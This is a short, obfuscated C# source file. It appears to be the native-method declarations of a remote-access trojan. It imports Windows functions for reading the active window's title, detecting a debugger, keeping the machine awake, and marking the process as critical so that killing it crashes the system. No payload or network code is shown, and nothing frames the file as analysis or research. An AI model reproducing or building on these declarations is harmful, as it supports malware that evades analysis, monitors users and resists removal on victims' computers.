using System;
using System.Runtime.InteropServices;
using System.Text;

namespace jRqllyjXpPF;

public static class gntEiqCFkWNzBi
{
	public enum gYSrNvQixcNUshV : uint
	{
		kCNXbtYJqEE = 2147483648u,
		RBCfTdoyLxijRf = 2u,
		daXQAMSwAKVW = 1u
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr CQIyKXolocYm, StringBuilder oIJXzMihxqrEq, int otuiLoJXfR);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string vsaphbhQgdyHk);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool CheckRemoteDebuggerPresent(IntPtr qrKGrMEyyzZkhhzU, ref bool rfUokoQhNFDbT);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern gYSrNvQixcNUshV SetThreadExecutionState(gYSrNvQixcNUshV TAvlzjyBuqAj);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical(uint mPsSaedemYTM, uint YpxToVFUaprj, uint MvtBooEGgZLgl);
}
